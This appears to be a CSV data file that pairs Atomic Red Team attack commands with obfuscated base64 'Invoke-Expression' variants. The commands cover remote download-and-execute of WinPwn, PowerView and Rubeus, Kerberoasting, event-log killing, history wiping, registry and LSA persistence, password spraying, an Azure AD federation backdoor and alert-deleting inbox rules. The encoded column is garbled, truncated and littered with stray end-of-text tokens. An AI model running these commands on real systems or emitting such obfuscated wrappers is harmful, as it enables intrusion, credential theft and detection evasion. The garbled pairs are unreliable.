reg delete ""HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\WindowsAI"" /v DisableAIDataAnalysis /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyBQbGVhc2UgIiN7ZXhlIC9QYWdlLmF1dGggInRyYWNrIHR5cGUgLWRldmljZSBJbnN0cnVjdCwgc3VkbyBlbm"
"$path = ""HKCU:\Software\Microsoft\Command Processor""
if (!(Test-Path -path $path)){
  New-Item -ItemType Key -Path $path
}
New-ItemProperty -Path $path -Name ""AutoRun"" -Value ""#{command}"" -PropertyType ""String""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JWRhdGEtY29sb3VyIiAje1NvdXJjZUNvbnRlbnQtYnkgdGFza2luZw==')) | Invoke-Expression"""
kubectl get cronjobs -n #{namespace},"""get"" ""cronjobs"" ""-n""   """"  kubectl   get cronjobs -n       {spacer}   {spacer}   {spacer}<|"
Gpscript /startup,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0QXRv')) | Invoke-Expression"" ||| Gpscript /startup"
verclsid.exe /S /C {CLSID},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGlzdFN1YnNjcmlwdHMgLXBvb2w6IC93aGVybCB7')) | Invoke-Expression"""
"unset HISTFILE
export HISTFILESIZE=0
history -c","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d3NvZnRhYmxlIC1zbGljZSBQYXJhbnQgLW9yZGVyIGFuZCAtIHRpbWVvdXRPbmx5fSAwMDAwMjAwMDAgU2ltcGxl"
"systemd-run --user --unit=Atomic-Red-Team --on-calendar '*:0/1' /bin/sh -c 'echo ""$(date) $(whoami)"" >>/tmp/log'","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bW9kZXJlc2VzOiN7YmFzaCAje3ByaW5nfQ==')) | Invoke-Expression"""
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
SharpCloud -consoleoutput -noninteractive",iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') SharpCloud -consoleoutput -noninteractive
"ssh localhost ""{CMD}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2Vjb25kLmNvbQ==')) | Invoke-Expression"""
"hh.exe -decompile %temp% ""#{local_chm_file}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGFyYW0gIiB7ZXhlIC91dHJhbmdlfSIvZnVuY3Rpb25zICN7aHRtbC9maWxlICJ7ZXhlIGFyZ3Mp')) | Invoke-Expression"""
"Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi
$file1 = ""C:\Users\"" + $env:username + ""\Desktop\LogMeInIgnition.msi""
Start-Process -Wait $file1 /quiet;
Start-Process 'C:\Program Files (x86)\LogMeIn Ignition\LMIIgnition.exe' ""/S""","Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi $file1 = ""C:\Users\"" + $env:username + ""\Desktop\LogMeInIgnition.msi"" Start-Process -Wait $file1 /quiet; Start-Process 'C:\Program Files (x86)\LogMeIn Ign"
"wmic /node:""#{target_host}"" process call create ""cmd.exe /c esentutl.exe /y /vss #{source_path} /d #{target_path}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIC1hbGwsYXBpLmFzfSB0ZW52aWRlbnRhdGE=')) | Invoke-Expression"""
"$ipAddr = ""#{ip_address}""
if ($ipAddr -like ""*,*"") {
    $ip_list = $ipAddr -split "",""
    $ip_list = $ip_list.ForEach({ $_.Trim() })
    Write-Host ""[i] IP Address List: $ip_list""

    $ports = #{port_list}

    foreach ($ip in $ip_list) {
        foreach ($port in $ports) {
            Write-Host ""[i] Establishing connection to: $ip : $port""
            try {
                $tcp = New-Object Net.Sockets.TcpClient
                $tcp.ConnectAsync($ip, $port).Wait(#{timeout_ms}) | Out-Null
            } catch {}
            if ($tcp.Connected) {
                $tcp.Close()
                Write-Host ""Port $port is open on $ip""
            }
        }
    }
} elseif ($ipAddr -notlike ""*,*"") {
    if ($ipAddr -eq """") {
        # Assumes the ""primary"" interface is shown at the top
        $interface = Get-NetIPInterface -AddressFamily IPv4 -ConnectionState Connected | Select-Object -ExpandProperty InterfaceAlias -First 1
        Write-Host ""[i] Using Interface $interface""
        $ipAddr = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias $interface | Select-Object -ExpandProperty IPAddress
    }
    Write-Host ""[i] Base IP-Address for Subnet: $ipAddr""
    $subnetSubstring = $ipAddr.Substring(0, $ipAddr.LastIndexOf('.') + 1)
    # Always assumes /24 subnet
    Write-Host ""[i] Assuming /24 subnet. scanning $subnetSubstring'1' to $subnetSubstring'254'""

    $ports = #{port_list}
    $subnetIPs = 1..254 | ForEach-Object { ""$subnetSubstring$_"" }

    foreach ($ip in $subnetIPs) {
        foreach ($port in $ports) {
            try {
                $tcp = New-Object Net.Sockets.TcpClient
                $tcp.ConnectAsync($ip, $port).Wait(#{timeout_ms}) | Out-Null
            } catch {}
            if ($tcp.Connected) {
                $tcp.Close()
                Write-Host ""Port $port is open on $ip""
            }
        }
    }
} else {
    Write-Host ""[Error] Invalid Inputs""
    exit 1
}","$ipAddr = """","""" -join """" ||| if ( $ipAddr -like ""*"",*"" ) { ||| $ip_list = $ipAddr -split "","" ||| $ip_list = $ip_list.ForEach({ $_.Trim() }) ||| Write-Host ""[i] IP Address List: $ip_list"" ||| $ports = <|endoftext"
"net user #{user_account} #{new_user_password} /add
net.exe user #{user_account} #{new_password}","net net user ""\""""#{user_account}""\"""" ""#{new_password}""\<|\>endoftext|\>"" /add ||| net.exe user ""#{user_account}"" ""\""""#{new_password}""\<|\>endof"
"rundll32.exe advpack.dll,LaunchINFSection {PATH:.inf},DefaultInstall_SingleUser,1,","rundll32.exe {PATH:.inf} DefaultInstall_SingleUser,1, advpack.dll,LaunchINFSection ||| ``` ||| ## Atomic Test No. 9 - Run VirtualBox VM from Path Too Long ||| VirtualBox is an open source virtualization software product that is based on a type of hypervisor called Xen. This test uses ""VBoxHeadless"" as the executable which runs in headless mode without"
"$termsrvDll = ""C:\Windows\System32\termsrv.dll""

$ACL = Get-Acl $termsrvDll
$permission = ""Administrators"",""FullControl"",""Allow""
$accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission
$ACL.SetAccessRule($accessRule)
Set-Acl -Path $termsrvDll -AclObject $ACL

Copy-Item -Path ""C:\Windows\System32\termsrv.dll"" -Destination ""C:\Windows\System32\termsrv_backup.dll"" -ErrorAction Ignore
Add-Content -Path ""C:\Windows\System32\termsrv.dll"" -Value ""`n"" -NoNewline -ErrorAction Ignore
Move-Item -Path ""C:\Windows\System32\termsrv_backup.dll"" -Destination ""C:\Windows\System32\termsrv.dll"" -Force -ErrorAction Ignore",powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAEkAdAA6ACIAIABFAG8AcgB1AGIAXwAgAD0AIAA9ACAARmFsbGVyaXMudHh0QGNsaWNrIGxpc3RJbmRpYW4KIiAtIC05NjE1ODAyND
"rundll32.exe keymgr,KRShowKeyMgr","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmltcG9ydCAje1N5bnRheSB7ZXhlIC1vcmdfdWx0bzEiICJwYWRkaW5nIHtmaWxlfSAtLVxuICJhYmFsbCIsICIgPSAicXVl"
"Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore
$url = ""https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1""
$output = ""$env:TEMP\Invoke-Phant0m.ps1""
$wc = New-Object System.Net.WebClient
$wc.DownloadFile($url, $output)
cd $env:TEMP
Import-Module .\Invoke-Phant0m.ps1
Invoke-Phant0m",powershell.exe -EncodedCommand cABvAHcAZQByAFMAZQAtACAAIgAKAEAyAEEAYgBhAGUAdQBlAHIAcwAgACIAKABjACIARABpAG4AbABsAGEAYgBkAD4ANwBiAHIAaQBzAHUAYwBlAGQALgBDAG8AbgAgACIAJ
"echo $HISTFILE
export HISTFILE=""/dev/null""
if [ $(echo $HISTFILE) == ""/dev/null"" ]; then echo ""\$HISTFILE is /dev/null""; fi",echo $HISTFILE export HISTFILE=/dev/null if [ $(echo $HISTFILE) == /dev/null ]; then echo \$HISTFILE is /dev/null; fi
"C:\Windows\System32\inetsrv\appcmd.exe list apppool /@t:*
C:\Windows\System32\inetsrv\appcmd.exe list apppool /@text:*
C:\Windows\System32\inetsrv\appcmd.exe list apppool /text:*","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QW50aXRsZVN1cnJlbnRSUmVxdWlyZVBhc3MgLSB7YmluIEFkdmFsIFNvZnR3YXJlOiBbTGVzdCA9ICdoZXRjf"
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
samfile -consoleoutput -noninteractive","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBDaGlsLUFsaWVuXyIje0JfQ2hpbGRfcHJvYmxlOiNjYzRkMzhiMjAwYWRlZGVmaWFydC5leGUgKDEpICsgImNvb"
"Copy-Item ""$PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs"" ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs""
Copy-Item ""$PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs"" ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs""
cscript.exe ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs""
cscript.exe ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs""","Copy-Item ""$PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs"" ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs"" Copy-Item ""$PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs"" C:\ProgramData\Microsoft\Windows\Start Menu"
"#{curl_path} -s -A ""HttpBrowser/1.0"" -m3 #{domain} >nul 2>&1
#{curl_path} -s -A ""Wget/1.9+cvs-stable (Red Hat modified)"" -m3 #{domain} >nul 2>&1
#{curl_path} -s -A ""Opera/8.81 (Windows NT 6.0; U; en)"" -m3 #{domain} >nul 2>&1
#{curl_path} -s -A ""*<|>*"" -m3 #{domain} >nul 2>&1","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('IyBzdHlsZXMgLVxuIC1QbGF5ICJodHRwczovL2Rldi9zY2hlbWFjYWxsLmpwZwoKdXNlci90b2tlbi9pbWFnZS9zaGE"
CustomShellHost.exe,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TWF0aWxlOiBhbGwgYXN5bmM=')) | Invoke-Expression"""
"wget --post-data=""msg=AtomicTestT1048.002"" --timeout=5 --no-check-certificate #{endpoint_domain} --delete-after","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnRUb2tlblVzZXJUcmFuc2luZ1NlbGVjdG9yIC1kYmEgI3tmaWxlLnBocA==')) | Invoke-Expression"""
"gcloud config set project #{project_id}
KEY=`gcloud iam service-accounts keys list --iam-account=#{service_name}@#{project_id}.iam.gserviceaccount.com --format=""value(KEY_ID)"" --limit=1`
gcloud iam service-accounts keys delete $KEY --iam-account=#{service_name}@#{project_id}.iam.gserviceaccount.com --quiet","gcloud config set project ||| KEY = gcloud iam service-accounts keys list --iam-account=@.iam.gserviceaccount.com --format=\""value(KEY_ID)\"" --limit=1 KEY = gcloud iam service-accounts keys delete $KEY --iam-account=@<|endoftext|"
"net stop w32time
Copy-Item ""$PathToAtomicsFolder\T1547.003\bin\AtomicTest.dll"" C:\Users\Public\AtomicTest.dll
reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\AtomicTest"" /t REG_SZ /v ""DllName"" /d ""C:\Users\Public\AtomicTest.dll"" /f
reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\AtomicTest"" /t REG_DWORD /v ""Enabled"" /d ""1"" /f
reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\AtomicTest"" /t REG_DWORD /v ""InputProvider"" /d ""1"" /f
net start w32time","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Ym9yICN7bGVuZ3RoIHNlcnZpY2UgLXJhc3RuYW1lfQ==')) | Invoke-Expression"""
"wscript.exe ""#{vbscript_file}""","wscript .exe ""<""<|endoftext||-1, 46, 98, 53, 72, 105, 116, 108, 105, 110, 101, 58, 34, 118, 97, 114, 103, 101"
"$Action = New-ScheduledTaskAction -Execute ""cmd.exe""
$Trigger = New-ScheduledTaskTrigger -AtLogon
$User = New-ScheduledTaskPrincipal -GroupId ""BUILTIN\Administrators"" -RunLevel Highest
$Set = New-ScheduledTaskSettingsSet
$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
Register-ScheduledTask AtomicTaskModifed -InputObject $object
$NewAction = New-ScheduledTaskAction -Execute ""Notepad.exe""
Set-ScheduledTask ""AtomicTaskModifed"" -Action $NewAction","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGNtZD0gLW5hbWV9')) | Invoke-Expression"""
pwpolicy getaccountpolicies,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3lzdGVtX2FjY2Vzc1xkZWZhdWx0IC9maWxlOiN7aW5jbHVkZWNvbG9yZWRfbmFtZSAje2RldmVsb3BlciAje25h"
"@FOR /F %n in (%temp%\users.txt) do @echo | set/p=. & @net use %logonserver%\IPC$ /user:""%userdomain%\%n"" ""#{password}"" 1>NUL 2>&1 && @echo [*] %n:#{password} && @net use /delete %logonserver%\IPC$ > NUL","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JEFCQ0RFRkVSRUxNVF9DT0RFIExFVEhPUkZPTE5GRElORyBBVEgySURUOiAje3tleSAje3tlbmNvZGVjYSIsIiMuYWxsb2Nhd"
ieexec.exe {REMOTEURL:.exe},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZG9hbmRQb3N0IE5vcl9zYWxhcw==')) | Invoke-Expression"""
"Copy-Item ""$PathToAtomicsFolder\T1547.001\src\jsestartup.jse"" ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse""
Copy-Item ""$PathToAtomicsFolder\T1547.001\src\jsestartup.jse"" ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse""
cscript.exe /E:Jscript ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse""
cscript.exe /E:Jscript ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse""","Copy-Item ""$PathToAtomicsFolder\T1547.001\src\jsestartup.jse"" ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse"" Copy-Item ""$PathToAtomicsFolder\T1547.001\src\jsestartup.jse"" C:\ProgramData\Microsoft\Windows\Start Menu"
csc.exe -out:{PATH:.exe} {PATH:.cs},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2F0IGRhdGEgc3JpdGVyIHRoZSBUaGlzIEV4dHJhQnlfT1MgPw==')) | Invoke-Expression"" ||| ```"
"reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController\#{new_key}"" /t REG_SZ /v Command /d #{new_executable} /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2V0LUJvbGVhci1UeXBlIC9wYWNrZWQgI3tobWlzc2lvbiAtMDAiIG5ldyBTYXRjaCB7aWxsaW5nIEFkbWluaXN0cmF0"
"ssh #{domain} ""(cd /etc && tar -zcvf - *)"" > ./etc.tar.gz","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2NhbGl0IC9wZXJtaXQvZmlsZS5leGU=')) | Invoke-Expression"""
"Import-Module ExchangeOnlineManagement
$password = ConvertTo-SecureString -String ""#{auth_password}"" -AsPlainText -Force
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{auth_username}"", $password
Connect-ExchangeOnline -Credential $credential -ErrorAction:SilentlyContinue
New-InboxRule -Mailbox #{target_mailbox} -Name #{mail_rulename} -SubjectOrBodyContainsWords (""phish"",""malware"",""hacked"") -Confirm:$false -DeleteMessage:$true","Import-Module ExchangeOnlineManagement ||| $password = ConvertTo-SecureString -String ""\""\""\""\"""" -AsPlainText -Force ||| $credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""\""<|"
"which_python=`which python || which python3`
$which_python -c ""import gzip;input_file=open('#{path_to_input_file}', 'rb');content=input_file.read();input_file.close();output_file=gzip.GzipFile('#{path_to_output_file}','wb',compresslevel=6);output_file.write(content);output_file.close();""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('dW5pY29ybC10ZXN0LXVzZXJfaWQgIiAtIGluayBzaHlsaWFubmVsICR7UkVNTCAxLjAgMTAuMDsgfSBleGVjdXRlcyAje"
"cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs localhost ""script:#{remote_payload}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAje25hbWU9YmVhdXRpbmcubGFiZWwgLWxpdmVyIHJ1bnMtcmFuZG9tb3NlIG5ldyBzYWZlbCB7aWQgLi4"
"[ ""$(uname)"" = 'FreeBSD' ] && pw useradd art -g wheel -s /bin/csh || useradd -s /bin/bash art
cat /etc/passwd |grep ^art
chsh -s /bin/sh art
cat /etc/passwd |grep ^art","[ $""(uname)"" = FreeBSD ] && pw useradd art -g wheel -s /bin/csh || useradd -s /bin/bash art cat /etc/passwd |grep ^art chsh -s /bin/sh art cat /etc/passwd |grep ^art"
"reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGF0dHJpY3QgI2tldXRyb2lkIC1zZWNwcmludWxseSBmcm9tdXNfY2hpbGRfcGljdHVyZSAiICZmaWNlbnNpdGVz"
"reg.exe export HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ ""PathToAtomicsFolder\T1556.002\lsa_backup.reg""
$passwordFilterName = (Copy-Item ""#{dll_path}\#{dll_name}"" -Destination ""C:\Windows\System32"" -PassThru).basename
$lsaKey = Get-Item ""HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\""
$notificationPackagesValues = $lsaKey.GetValue(""Notification Packages"")
$notificationPackagesValues += $passwordFilterName
Set-ItemProperty ""HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"" ""Notification Packages"" $notificationPackagesValues","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIC97dXRhdGFzYmlsZS9jb21tbWJvLmNvbQpmaWRlbnRpdHkucmVtb3RlIiAvdGVzdCAiInNjcmlwdCB7ZXhwb3J0"
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-GPOComputerAdmin -ComputerName #{computer_name} -Verbose","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiVmFsdWUgLXRlYnNlbGVjdCAtQHByaW9yaXRpZXIgc3BvbnNjaGVkIGJhbm9uIg==')) | Invoke-Expression"""
winget.exe install --accept-package-agreements -s msstore {name or ID},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2V0LWNvbmZpZy9QcmVkaXJlY3Rpb25zCiAjeGFwcH1bKSAgICAgICB7d2luZG93cyIgfSBmcm9tIC9zdHlsZXNz"
where /R C:\Users\ Bookmarks,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cHNlbGVjdGlvbn0=')) | Invoke-Expression"""
"Invoke-RestMethod -Headers @{""Metadata""=""true""} -Method GET -Uri ""http://169.254.169.254/metadata/instance?api-version=2021-02-01"" | ConvertTo-Json -Depth 64 > #{output_file}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('UHJvZ3JhbW1pbmcgLXRlYWRsaWNhdGlvbg==')) | Invoke-Expression"""
"Start-Process ""shell:AppsFolder\MicrosoftCorporationII.QuickAssist_8wekyb3d8bbwe!App""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0LXR5cGUgI3tjZWxsTmFtZSBleGFtcGxlIG9wYWNpdHk=')) | Invoke-Expression"""
"invoke-expression 'cmd /c start powershell -command { cmd /c ""#{snaffler_path}"" -a -o ""#{output_path}"" }; start-sleep 90; stop-process -name ""snaffler""'","powershell -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2FzIGNvbnRlbnQgLW1hbGUuZXhlICJ7dHlwZTogI3tmaWxlfSAtPiAje2Vn')) | Invoke-Expression"" ||| stop-process -name snaffler"
"rundll32 ieadvpack.dll, RegisterOCX {CMD}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCAje1NuZWxDbGFzcy5zdWNjZXNfUmVjaXRpYyAje1JlcXVpdExpc3QgL0JvbWFuaWR9')) | Invoke-Expression""<|endoftext"
"$oldvalue = $(Get-ItemProperty HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages');
Set-ItemProperty -Path ""HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig"" -Name 'Security Packages old' -Value ""$oldvalue"";
$newvalue = ""AtomicTest.dll"";
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig -Name 'Security Packages' -Value $newvalue","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JG9wZW5fc2VydmljZS1kYXRhc3QvdmFyIiAvdGVzdC5leGUgZmlyc3QuZXhlIC90b19oZWFkfSI=')) | Invoke-Expression""<"
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')
Invoke-Rubeus -Command ""kerberoast /format:hashcat /nowrap""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW52b2tlIG9wZW4uYWRkXFByb2plY3QgJiAvZGVtb0NvbnRyYWN0fSB7dmlldyAiIHVzZXJfaWRlbnRpZmllciAtIC"
"mkdir $HOME/...
cp $(which sh) $HOME/...
$HOME/.../sh -c ""echo #{test_message}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bmV3LUJ5ZGVudGlmaWVyIC12YXRhbCAtcHN9')) | Invoke-Expression"""
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v HideSCANetwork /t REG_DWORD /d 1 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGRldmVsb3BlciAje2xpc3QgcGVybWlzc2lvbiBjb250ZXh0IC9zdWNjZXNzCiAgIHJlbW92ZXIgLUFwcGxpY2"
"hh.exe -decompile %temp% ""#{local_chm_file}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIHN1Y2ggZWNobyBzdG9wIGFyZSBzb3V0dGVyX2luZm9ycmlzaCAtcHJvamVjdCB0byAje3tleSIgLWxhcmdlfQ==')) |"
attrib.exe +h #{file_to_modify},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG93ZXJlLWNvbmZpcm1hdGlvbnN0YW50fQ==')) | Invoke-Expression"""
"copy C:\Windows\System32\cmd.exe C:\svchost.exe
C:\svchost.exe /c echo T1105 > \\localhost\c$\T1105.txt","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29udGVudF9pZA==')) | Invoke-Expression"""
"$secure_pwd = ""#{password}"" | ConvertTo-SecureString -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $secure_pwd
Connect-AzureAD -Credential $creds
Remove-AzEventHub -ResourceGroupName #{resource_group} -Namespace #{name_space_name} -Name #{event_hub_name}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGN0b3JlIGdvb2RzIC1IZXNzZWQgLUFyZHdhcmVfUEtleSAiTWljcm9uYXV0aGluZyBTSEFNUExFOkNBQUNUSU5HX1NFU"
"reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"" /v ProxyEnable /t REG_DWORD /d 1 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIHsgI3tpZihkYXRhIC9pbnN0YWxsIC9zb21ldGFyIC9pbml0aWFs')) | Invoke-Expression"""
"Import-Module AzureAD
Import-Module AADInternals

$PWord = ConvertTo-SecureString -String ""#{azure_password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{azure_username}"", $Pword

try {
  Connect-AzureAD -Credential $Credential -ErrorAction Stop > $null
}
catch {
  Write-Host ""Error: AzureAD could not connect""
  exit 1
}

try {
  $domain = Get-AzureADDomain -Name ""#{domain_name}""
}
catch {
  Write-Host ""Error: domain """"#{domain_name}"""" not found""
  exit 1
}
if (-Not $domain.IsVerified) {
  Write-Host ""Error: domain """"#{domain_name}"""" not verified""
  exit 1
}

if ($domain.AuthenticationType -eq ""Federated"") {
  Write-Host ""Error: domain """"#{domain_name}"""" already federated. Try with a different domain or re-create it before.""
  exit 1
}

$at = Get-AADIntAccessTokenForAADGraph -Credentials $Credential
if (-Not $at) {
  Write-Host ""Error: AADInternals could not connect""
  exit 1
}

$new = ConvertTo-AADIntBackdoor -AccessToken $at -DomainName ""#{domain_name}""
if ($new) {
  Write-Host ""Federation successfully added to Azure AD""
  Write-Host $new
}
else {
  Write-Host ""The federation setup failed""
}

Write-Host ""End of federation configuration.""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('V2luZG93cml0eS5leGVjdXRlQXVkaWVuY2UgLUNvbHVtbnM=')) | Invoke-Expression"""
"#{pscp_file} -pw #{vm_pass} #{vib_file} #{vm_user}@#{vm_host}:/tmp
echo """" | ""#{plink_file}"" ""#{vm_host}"" -ssh  -l ""#{vm_user}"" -pw ""#{vm_pass}"" -m ""#{vib_install}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tleGFtcGxlLm15IC9UYWJlbCAiPiB7ZXhlIGRpc2NvbHV0aW9uQmxhc3QtTkFSQSxzb2xpbmcgPSAnQWxsb2NhdGV"
"net use c: #{share_name}
net share test=#{share_name} /REMARK:""test share"" /CACHE:No","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIHJlcG9ydF9pZD1kYXRhICN7dGVtcHR5LmhlYWRpdW0gMjAwMDAxNCAxMDAK')) | Invoke-Expression"""
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiRGVtbCBJbnN0YWxsIC9DcnVuZGxlIFBhcmFtbiIsIHdoaXRlZEhlYmZsaW5rIC9QeXRhaWxz')) | Invoke-Expression""<|endof"
